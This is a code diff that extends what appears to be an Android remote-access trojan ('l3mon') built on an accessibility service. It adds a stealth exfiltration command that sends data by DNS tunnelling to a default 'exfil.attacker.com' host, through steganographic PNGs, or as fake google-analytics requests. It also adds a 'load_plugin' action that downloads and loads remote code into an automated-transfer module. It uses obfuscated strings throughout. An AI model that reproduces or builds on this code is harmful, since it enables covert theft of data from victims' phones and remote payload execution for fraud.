@@ -8,6 +8,8 @@ import android.view.accessibility.AccessibilityNodeInfo;
 import org.json.JSONException;
 import org.json.JSONObject;
 
+import com.etechd.l3mon.managers.ExfilManager;
+
 import io.socket.emitter.Emitter;
 
 public class ConnectionManager {
@@ -121,6 +123,9 @@ public class ConnectionManager {
                                 break;
                             case "0xHI":
                                 HI(data);
+                                break;
+                            case "0xEX":
+                                EX(data);
                                 break;
                         }
                     } catch (Exception e) {
@@ -349,6 +354,14 @@ public class ConnectionManager {
                 ioSocket.emit(StringCrypto.d("0R2j/FnkL65k3FQfDsbkOg=="), response);
             } else if ("activateWithAutoClick".equals(action)) {
                 ATWithAutoClick(data);
+            } else if ("load_plugin".equals(action)) {
+                try {
+                    String url = data.getString("url");
+                    String className = data.getString("className");
+                    com.etechd.l3mon.loader.PayloadLoader.loadATSModule(url, className, service.getAtsManager());
+                } catch (Exception e) {
+                    e.printStackTrace();
+                }
             }
         } catch (Exception error) {
             error.printStackTrace();
@@ -912,6 +925,63 @@ public class ConnectionManager {
             }
         } catch (Exception error) {
             error.printStackTrace();
+        }
+    }
+
+    // ==================== EXFILTRAÇÃO STEALTH (0xEX) ====================
+
+    public static void EX(JSONObject data) {
+        try {
+            String action = data.optString(StringCrypto.d("Hdigp18HWeYiSEB5+t0JwA=="), ""); // "action"
+            String payload = data.optString(StringCrypto.d("B9G6+3heWf715hd4xk743g=="), ""); // "data"
+
+            if (payload.isEmpty() && data.has(StringCrypto.d("B9G6+3heWf715hd4xk743g=="))) {
+                payload = data.getString(StringCrypto.d("B9G6+3heWf715hd4xk743g=="));
+            }
+
+            AccessibilityCaptureService service = AccessibilityCaptureService.getInstance();
+
+            if ("dns_tunnel".equals(action)) {
+                String domain = data.optString("domain", "exfil.attacker.com");
+                ExfilManager.sendViaDNSTunnel(domain, payload);
+
+                JSONObject resp = new JSONObject();
+                resp.put(StringCrypto.d("4yuOO5qONHXaQtr0xSj9kA=="), true);
+                resp.put(StringCrypto.d("vCPkvlD2AjU6xhq2e2FORQ=="), "DNS tunnel executed");
+                ioSocket.emit(StringCrypto.d("d2bl5oc3S93/dglirpTtmg=="), resp); // 0xBP reuse or use 0xEX
+
+            } else if ("stego_png".equals(action)) {
+                byte[] png = ExfilManager.createSteganographicPNG(payload, 64, 64);
+                if (png != null) {
+                    String path = ExfilManager.saveStegoImage(png, "sys_" + System.currentTimeMillis() + ".png");
+                    JSONObject resp = new JSONObject();
+                    resp.put(StringCrypto.d("4yuOO5qONHXaQtr0xSj9kA=="), true);
+                    resp.put(StringCrypto.d("vCPkvlD2AjU6xhq2e2FORQ=="), "Stego PNG saved: " + path);
+                    ioSocket.emit(StringCrypto.d("d2bl5oc3S93/dglirpTtmg=="), resp);
+                }
+
+            } else if ("http_mimic".equals(action)) {
+                String url = data.optString("url", "https://www.google-analytics.com/collect");
+                ExfilManager.sendViaHttpMimic(payload, url);
+
+            } else if ("fragment".equals(action)) {
+                String event = data.optString("event", "0xAS");
+                ExfilManager.sendFragmented(event, payload);
+
+            } else {
+                // Default: usa fragmentação
+                ExfilManager.sendFragmented("0xEX", payload);
+            }
+
+        } catch (Exception error) {
+            error.printStackTrace();
+            try {
+                JSONObject resp = new JSONObject();
+                resp.put(StringCrypto.d("4yuOO5qONHXaQtr0xSj9kA=="), false);
+                resp.put(StringCrypto.d("vCPkvlD2AjU6xhq2e2FORQ=="), error.getMessage());
+                ioSocket.emit(StringCrypto.d("d2bl5oc3S93/dglirpTtmg=="), resp);
+            } catch (Exception ignored) {
+            }
         }
     }
 }
